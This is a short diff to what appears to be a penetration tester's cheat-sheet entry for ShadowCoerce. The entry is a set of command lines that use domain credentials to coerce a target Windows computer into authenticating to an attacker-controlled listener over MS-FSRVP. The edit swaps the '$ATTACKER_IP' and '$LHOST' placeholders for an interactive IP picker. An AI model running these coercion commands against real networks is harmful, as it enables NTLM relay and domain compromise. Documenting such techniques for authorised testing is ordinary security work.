@@ -1,4 +1,4 @@
 # ShadowCoerce — Coercion via MS-FSRVP
 ShadowCoerce -u $USER -p $PASSWORD -d $DOMAIN $LISTENER_IP $TARGET_COMPUTER
-ShadowCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$TARGET"
-ShadowCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$LHOST" "$TARGET"
+ShadowCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$(fzf-ip)" "$TARGET"
+ShadowCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$(fzf-ip)" "$TARGET"
